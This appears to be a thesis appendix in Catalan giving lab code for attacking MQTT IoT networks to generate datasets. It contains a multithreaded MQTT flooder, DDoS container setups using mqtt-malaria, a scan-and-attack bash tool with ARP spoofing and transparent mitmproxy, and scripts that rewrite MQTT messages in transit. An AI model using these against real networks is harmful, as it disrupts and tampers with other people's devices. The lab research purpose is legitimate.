\chapter{Apèndix}

\begin{lstlisting}[language=yaml, caption={Desplegament de la xarxa totalment simulada}, label=code:exemple]
services:
  broker:
    image: eclipse-mosquitto
    container_name: broker
    privileged: true
    ports:
      - "1883:1883s"
    volumes:
      - /home/joel/Documents/UNI/TFG/broker/mosquitto/config:/mosquitto/config
      - /home/joel/Documents/UNI/TFG/broker/mosquitto/data:/mosquitto/data
      - /home/joel/Documents/UNI/TFG/broker/mosquitto/log:/mosquitto/log
    networks:
      - IoTnet
  client1:
    image: mqttclient
    container_name: client1
    command: bash -c "apt update && sleep infinity"
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/clients/cl1:/home/
    networks:
      - IoTnet
  client2:
    image: mqttclient
    container_name: client2
    command: bash -c "apt update && sleep infinity"
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/clients/cl2:/home/
    networks:
      - IoTnet
  atacant:
    image: kalitfg
    container_name: atacant
    command: bash -c "apt update && sleep infinity"
    environment:
      - DISPLAY=\${DISPLAY}
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/observador:/home/
      - /tmp/.X11-unix:/tmp/.X11-unix
    networks:
      - IoTnet

networks:
  IoTnet:
    driver: bridge

\end{lstlisting}

\begin{lstlisting}[language=Python, caption={Script de Python per a l'atac de Denegació de Servei}, label=lst:DoSScript]
import sys
import paho.mqtt.client as mqtt
import time
from threading import Thread
import argparse

parser = argparse.ArgumentParser(description='MQTT Client')
parser.add_argument('broker', help='MQTT broker address')
                    
broker = parser.parse_args().broker
port = 1883
topic = "mqttTest"
messages_per_run =1000
threads = 1000

counter = 0

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to MQTT broker successfully")
    else:
        print(f"Failed to connect, return code {rc}")

def mqtt_flood():
    global counter
    client = mqtt.Client()
    client.on_connect = on_connect
    client.connect(broker, port, 60)
    client.loop_start()
    try:
        while True:
            for _ in range(messages_per_run):
                counter += 1
                message = f"Payload: {counter % 10 * 1024}"
                client.publish(topic, message, qos=2, retain=True)
                print(f"Sent message: {message}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("[-] Canceled by user")
        client.loop_stop()
        client.disconnect()

try:
    print("Starting MQTT Flooder...\n")
    for _ in range(threads):
        t = Thread(target=mqtt_flood)
        t.start()
except KeyboardInterrupt:
    print("[-] Canceled by user")
\end{lstlisting}

\begin{lstlisting}[language=yaml, caption={Desplegament de contenidors per a l'atac DDoS}, label=lst:DDoS]
services:
  client1:
    image: client-mqtt-malaria
    container_name: client1
    privileged: true
    volumes:
      - ./clients/cl1:/home/
    environment:
      - ip_broker=${ip_broker}
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 8 -n 10000 -H $${ip_broker} -s 100 -q 2"
    networks:
      IoTnet:
        ipv4_address: ${ip_cl1}

  client2:
    image: client-mqtt-malaria
    container_name: client2
    privileged: true
    volumes:
      - ./clients/cl1:/home/
    environment:
      - ip_broker=${ip_broker}
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 8 -n 10000 -H $${ip_broker} -s 100 -q 2"
    networks:
      IoTnet:
        ipv4_address: ${ip_cl2}

networks:
  IoTnet:
    driver: macvlan
    driver_opts:
      parent: ${interface}
    ipam:
      config:
        - subnet: ${net}${mask}
          gateway: ${gw}
\end{lstlisting}

\begin{lstlisting}[language=yaml, caption={Desplegament de contenidors per a l'atac Low-Rate DDoS}, label=lst:LowRateDDoS]
  services:
  client1:
    image: kalilinux/kali-last-release
    container_name: client1
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 t -H 192.168.0.15 -s 100 -q 2 -c cl1"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.101

  client2:
    image: kalilinux/kali-last-release
    container_name: client2
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -t -H 192.168.0.15 -s 100 -q 2 -c cl2"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.102

  client3:
    image: client-mqtt-malaria
    container_name: client3
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -t -H 192.168.0.15 -s 100 -q 2 -c cl3"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.103

  client4:
    image: client-mqtt-malaria
    container_name: client4
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -H 192.168.0.15 -s 100 -q 2 -c cl4"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.104

  client5:
    image: client-mqtt-malaria
    container_name: client5
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -H 192.168.0.15 -s 100 -q 2 -c cl5"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.105

  client6:
    image: client-mqtt-malaria
    container_name: client6
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -H 192.168.0.15 -s 100 -q 2 -c cl6"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.106

  client7:
    image: client-mqtt-malaria
    container_name: client7
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -H 192.168.0.15 -s 100 -q 2 -c cl7"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.107

  client8:
    image: client-mqtt-malaria
    container_name: client8
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -H 192.168.0.15 -s 100 -q 2 -c cl8"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.108
    
  client9:
    image: client-mqtt-malaria
    container_name: client9
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -t -H 192.168.0.15 -s 100 -q 2 -c cl9"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.109
      
  client10:
    image: kalilinux/kali-last-release
    container_name: client10
    privileged: true
    volumes:
      - /home/joel/Documents/UNI/TFG/CLIENTS_ENV/clients/cl1:/home/
    command: bash -c "python2 /home/mqtt-malaria/malaria publish -P 1 -n 50 -t -H 192.168.0.15 -s 100 -q 2 -c cl10"
    networks:
      IoTnet:
        ipv4_address: 192.168.0.110

networks:
  IoTnet:
    driver: macvlan
    driver_opts:
      parent: wlp42s0
    ipam:
      config:
        - subnet: 192.168.0.0/24
          gateway: 192.168.0.1
\end{lstlisting}


\begin{lstlisting}[language=bash, caption={Eina automatitzada per a la generació de datasets}, label=lst:tool]
#!/bin/bash
flag_dos=false
flag_mitm=false
flag_inspect=false
flag_sniffing=false
num_clients=2
compose_file="./CLIENTS_ENV/docker-compose-offline.yml"

#a modificar:
net=192.168.0.0
mask=/24
gw=192.168.0.1
interface=wlp42s0
ip_victima=10.4.39.25



#1- Captura de paquets amb tcpdump
#2- Masscan per trobar el broker
#3-Nmap -sn per trobar clients connectats
#4- Nmap nse-script per trobar info rellevant del broker
#5- Sniffing mosquitto_sub per trobar tòpics
#6- Despegament d'entorn simulat DDoS
#7- Arp spoof i MITM proxy
#8- Analisis de la captura pcap amb zeek per extreure conclusions

while getopts "mdis" opt; do
    case $opt in 
        m) flag_mitm=true ;;
        d) flag_dos=true ;;
        i) flag_inspect=true ;;
        s) flag_sniffing=true ;;
        \?) echo "opció invalida: -$OPTARG" >&2
            exit 1 ;;
    esac
done

cleanup() { #per apagar el docker amb Ctl+C
    echo -e "\n Tancant escenari: \n"
    sudo docker compose -f "$compose_file" down
    sudo docker stop escaner && sudo docker rm escaner
    sudo docker exec -it sniffer bash -c "kill -2 1"
    sudo docker stop sniffer && sudo docker rm sniffer
    sudo docker stop mitm && sudo docker rm mitm

    #8- Analisis de la captura pcap amb zeek per extreure conclusions
    echo -e "\n Analitzant paquets capturats \n"
    sudo docker run --rm --name analitzador --network host -v "$(pwd)/escaner":/home zeek/zeek bash -c "cd /home/zeek && zeek -r /home/zeek/capt.pcap"
    exit 0
}
trap cleanup SIGINT SIGTERM

mkdir -p ./escaner
sudo docker run -d --name escaner --network host -v "\$(pwd)/escaner":/home ubuntu:latest sleep infinity #contenidor ubuntu mb interface del host
sudo docker exec escaner bash -c "apt update && apt install -y nmap masscan prips mosquitto-clients"

#1- Captura de paquets amb tcpdump
echo -e "\n captura de paquets \n"
sudo docker run -d --name sniffer --network host -v "\$(pwd)/escaner/zeek":/home ubuntu:latest bash -c "apt update && apt install -y tcpdump && tcpdump -i \$interface -w /home/capt.pcap" #Monitoreig xarxa tcpdump

#2- Masscan per trobar el broker
echo -e "\n    - Escaneig de xarxa per MQTT en el rang \$net \$mask : \n"
sudo docker exec escaner bash -c "cd /home && masscan \$net\$mask -p1883 --rate 1000 -oG masscan.txt" #masscan per trobar el broker via tcp port 1883
ip_broker=\$(grep "Host: " ./escaner/masscan.txt | awk '{print \$4}')
echo -e "\n IP Broker: \$ip_broker \n"

#3- Nmap -sn per trobar clients connectats
echo -e "\n Trobant IPs clients MQTT \n" 
sudo docker exec escaner bash -c "cd /home && nmap -sn \$net\$mask -oG devices.txt"
grep "^Host:" "./escaner/devices.txt" | awk '{print \$2}' | cut -d'(' -f1 > "ips.txt"
#ip_victima=\$(head -n 1 ips.txt) #no es útil perque agafa disp no mqtt
#echo -e "\n IP Victima: \$ip_victima \n"


#4- Nmap nse-script per trobar info rellevant del broker
if [ "\$flag_inspect" = true ]; then 
    echo -e "\n    - Extreient informació del broker MQTT \$ip_broker...\n"
    sudo docker exec escaner bash -c "cd /home && nmap -Pn --script mqtt-subscribe -p 1883 -oG info_broker.txt \$ip_broker" #scipts info broker
    sudo docker exec escaner bash -c "python3 mqttsa.py -u "admin" -w ./psw.txt -t 5 -mp 255 -mq 1000 $ip_broker > info_broker2.txt "
fi

#5- Sniffing mosquitto_sub per trobar tòpics
if [ "\$flag_sniffing" = true ]; then
    echo -e "\n    - Subscribint-se temporalment al broker per capturar missatges: \n"
    sudo docker exec escaner bash -c "cd /home && timeout 5s mosquitto_sub -h \$ip_broker -t '#' -v > mqtt_sub.txt" #escolta pasiva tòpics durant 5s
    read topic msg < <(awk '{print \$1, \$2}' ./escaner/mqtt_sub.txt)  #no cal printejar realment
    echo -e "\n    - Topic: \$topic  Msg: \$msg \n"
fi

#6- Despegament d'entorn simulat DoS
if [ "\$flag_dos" = true ]; then
    sudo docker exec escaner bash -c "cd /home && source /home/ip_lliures.sh \$net\$mask \$num_clients" #IPs lliures a la xarxa  (genera les num_clients seguents a partir de la .100)
    source ./escaner/vars.env
    echo -e "\n IPs Clients simulates: \n   - CL1: \$ip_cl1 \n   - CL2: \$ip_cl2 \n"
    echo -e "\n    - Desplegant entorn simulat, executant analitzador i atac DDoS \n" 
    export ip_broker ip_cl1 ip_cl2 net gw interface mask #exportar variables per ser utilitzades en el docker compose (paràmetre -E)
    sudo -E docker compose -f "\$compose_file" up -d  #Desplegament d'escenari
fi

#7- Arp spoof i MITM proxy
if [ "\$flag_mitm" = true ]; then
    echo -e "\n executant arp spoofing \n"
    sudo docker run -d --name mitm  --privileged --network host -v "\$(pwd)/escaner":/home kalitfg sleep infinity
    sudo docker exec -it mitm bash -c "apt update && sysctl -w net.ipv4.ip_forward=1 && iptables -t nat -A PREROUTING -p tcp --dport 1883 -j REDIRECT && iptables -t nat -A POSTROUTING -p tcp --dport 1883 -j SNAT --to-source \$ip_victima"
    sudo docker exec -d mitm bash -c "arpspoof -i \$interface -t \$ip_victima -r \$ip_broker"
    sudo docker exec -it mitm bash -c "mitmproxy --mode transparent --listen-port 1883 --tcp-hosts '.*' -s /home/mqtt_mitm.py"
    #sudo docker exec -d mitm bash -c "bettercap -iface wlp42s0 -eval \"set arp.spoof.fullduplex true; set arp.spoof.targets \$ip_victima; arp.spoof on\""
    #sudo docker exec -it mitm bash -c "apt update && apt install -y bettercap && bettercap -iface wlp42s0 -eval \"set tcp.proxy.port 1883 ; set tcp.address '\$ip_broker' ; set tcp.port 1883 ; tcp.proxy on ; set arp.spoof.internal true ; set arp.spoof.targets '\$ip_victima', '\$ip_broker' ; arp.spoof on\""
fi

while true; do #per apagar el docker amb Ctl+C
    sleep 1
done     

\end{lstlisting}

\begin{lstlisting}[language=Python, caption={Script de modificació de missatges en mitmproxy}, label=lst:ScriptMITM]
from mitmproxy import tcp

def tcp_message(flow: tcp.TCPFlow):
    data = flow.messages[-1].content
    try:
        if b"test" and not flow.messages[-1].from_client in data:
            print("[+] Mensaje original:", data)
            data_mod = data.replace(b'"test":1', b'"test":5')
            flow.messages[-1].content = data_mod
            print("[+] Mensaje modificado:", data_mod)
    except Exception as e:
        print("[!] Error procesando mensaje:", e)
\end{lstlisting}


\begin{lstlisting}[language=Python, caption={Script de modificació de missatges en mitmproxy en baix nivell}, label=lst:ScriptMITM2]
from mitmproxy import tcp

def decode_remaining_length(data, offset):
    multiplier = 1
    value = 0
    bytes_used = 0
    while True:
        encoded_byte = data[offset]
        value += (encoded_byte & 127) * multiplier
        offset += 1
        bytes_used += 1
        if (encoded_byte & 128) == 0:
            break
        multiplier *= 128
    return value, bytes_used

def tcp_message(flow: tcp.TCPFlow):
    data = flow.messages[-1].content
    try:
        if data and data[0] & 0xF0 == 0x30:  # 0x30 = PUBLISH
            print("[+] Detected MQTT PUBLISH")

            # Decodificar
            remaining_length, len_len = decode_remaining_length(data, 1)

            fixed_header_len = 1 + len_len
            topic_len = int.from_bytes(data[fixed_header_len:fixed_header_len+2], "big")
            topic_start = fixed_header_len + 2
            topic_end = topic_start + topic_len
            payload_start = topic_end
            payload = data[payload_start:]

            print(f"[+] Topic: {data[topic_start:topic_end].decode()}")
            print(f"[+] Payload original: {payload}")

            # Modificar payload
            new_payload = b"MODIFICADO"

            new_remaining_length = 2 + topic_len + len(new_payload)
            new_remaining_bytes = bytearray()
            x = new_remaining_length
            while True:
                byte = x % 128
                x //= 128
                if x > 0:
                    byte |= 128
                new_remaining_bytes.append(byte)
                if x == 0:
                    break

            # Reconstruir el mensaje MQTT
            fixed_header = bytes([data[0]]) + bytes(new_remaining_bytes)
            topic_part = data[fixed_header_len:payload_start]
            new_msg = fixed_header + topic_part + new_payload

            flow.messages[-1].content = new_msg
            print(f"[+] Payload modificado: {new_payload}")

    except Exception as e:
        print(f"[!] Error modificando MQTT PUBLISH: {e}")
\end{lstlisting}

